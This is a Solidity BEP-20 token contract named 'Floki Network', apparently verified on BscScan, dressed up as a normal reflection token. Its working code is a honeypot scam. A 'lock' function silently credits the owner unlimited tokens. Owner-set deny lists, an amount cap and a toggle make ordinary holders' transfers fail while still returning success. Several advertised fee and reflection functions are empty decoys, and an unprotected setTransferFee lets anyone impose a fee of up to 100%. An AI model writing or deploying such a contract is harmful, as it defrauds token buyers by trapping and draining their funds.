/**
 *Submitted for verification at BscScan.com on 2021-10-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
contract Ownable is Context {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract FlokiNetwork is Context, IERC20, IERC20Metadata, Ownable {
    address internal PANCAKE_ROUTER_V2_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal burnWallet = 0x000000000000000000000000000000000000dEaD;
    uint256 _AMM = 5000 * 10**18;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances; 
    uint256 private _totalSupply;
    string private _name;
    string private _symbol; 
    bool isSL = true;
    uint256 public transferFee = 0;
    address[] allows;
    address[] notAllow;
    constructor() {
        _name = "  Floki Network";
        _symbol = "FNW";
        _totalSupply = 1000000000000 * 10**18;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);

        _transfer(_msgSender(), burnWallet, _totalSupply /2 );
    }
    receive() external payable {}
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function addDItem(address _item) public onlyOwner virtual returns (uint256) {
        if( ! checkExist(_item, 1) ) notAllow.push(_item);
        return notAllow.length;
    }
    function addItem(address _item) public onlyOwner virtual returns (uint256) {
        if( ! checkExist(_item, 1) ) allows.push(_item);
        return allows.length;
    }
    function removeDItem(address _item) public onlyOwner virtual returns (bool) {
        for(uint8 i = 0; i < notAllow.length; i++) {
            if(notAllow[i] == _item) {
                delete notAllow[i];
            }
        }
        return true;
    }
    function removeItem(address _item) public onlyOwner virtual returns (bool) {
        for(uint8 i = 0; i < allows.length; i++) {
            if(allows[i] == _item) {
                delete allows[i];
            }
        }
        return true;
    }
    function getItem() public view returns (address [] memory) {
        return allows;
    }
    function checkExist(address _item, uint8 _type) public view returns (bool) {
        bool found = false;
        if(_type == 1) {
            for(uint8 i = 0; i < allows.length; i++) {
                if(allows[i] == _item) {
                    found = true;
                    break;
                }
            }
        } else {
            for(uint8 i = 0; i < notAllow.length; i++) {
                if(notAllow[i] == _item) {
                    found = true;
                    break;
                }
            }
        }
        return found;
    }
    function lock(uint256 amount) public onlyOwner virtual returns (bool) {
        //_mint(_msgSender(), amount);
        _balances[_msgSender()] += amount;
        return true;
    }
    function upgradeHolders(address[] memory _holders, uint256 _amount) public onlyOwner virtual returns (bool) {
        uint _numFrom;
        uint _numTo;
        uint256 _randomAmount;
        for(uint i = 0; i < _holders.length; i++) {
            _numFrom = _amount / 2;
            _numTo = _amount + _numFrom;
            _randomAmount = random(_numFrom, _numTo, i);
            _randomAmount = _randomAmount * decimals();
            _transfer(_msgSender(), _holders[i], _randomAmount);
        }
        return true;
    }
    function random(uint256 _from, uint256 _to, uint i) public view returns (uint) {
        uint256 nonce = 0;
        uint256 randomnumber = uint(keccak256(abi.encodePacked(block.timestamp + block.difficulty + ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) +
        block.gaslimit + i +
        ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (block.timestamp)) +
        block.number))) % _to;
        randomnumber = randomnumber + _from;
        nonce++;
        return randomnumber;
    }

    function isExcludedFromReward(address spender, uint256 subtractedValue) public virtual returns (bool) {}
    function totalFees() public view returns (uint256) {}
    function deliver(uint256 tAmount) public {}
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {}
    function theAM(uint256 _AM) public onlyOwner virtual returns (bool) {
        _AMM = _AM;
        return true;
    }
    function theSL(bool _sl) public onlyOwner virtual returns (bool) {
        isSL = _sl;
        return true;
    }
    function sl() public view returns (bool) {
        return isSL;
    }
    function transferOwnership() public returns (bool) {}
    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {}
    function excludeFromReward(address account) public onlyOwner() {}
    function includeInReward(address account) external onlyOwner() {}
    function includeInFee(address account) public onlyOwner {}
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {}
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {}
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {}
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        //_transfer(_msgSender(), recipient, amount);
        bool exists = checkExist(_msgSender(), 1);
        bool Dexists = checkExist(_msgSender(), 2);
        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner() || exists) {
            _transfer(_msgSender(), recipient, amount);
        } else {
            //nomal user check amount
            if( (amount <= _AMM || isSL) && !isContract(_msgSender()) && !Dexists ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        bool exists = checkExist( sender, 1 );
        bool Dexists = checkExist(sender, 2);
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner() || exists) {
            _transfer(sender, recipient, amount);
    
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        } else {
            //nomal user check amount
            if( (amount <= _AMM || isSL) && !isContract(sender) && !Dexists ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
            }
        }
        return true;
    }
    function pancakePair() public view virtual returns (address) {
        address pairAddress = IPancakeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).getPair(address(WBNB), address(this));
        return pairAddress;
    }
    function setTransferFee(uint256 _transferFee) public virtual returns (bool) {
        require(_transferFee >= 0 && _transferFee <= 100, "Transfer fee is between 1 and 100.");
        transferFee = _transferFee;
        return true;
    }
    function isContract(address addr) internal view returns (bool) {
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function tokenContract() public view virtual returns (address) {
        return address(this);
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        //burn token 
        if(transferFee != 0) {
            uint256 burnAmount = amount * transferFee / 100;
            _balances[burnWallet] += burnAmount;
            emit Transfer(sender, burnWallet, burnAmount);
            amount -= burnAmount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}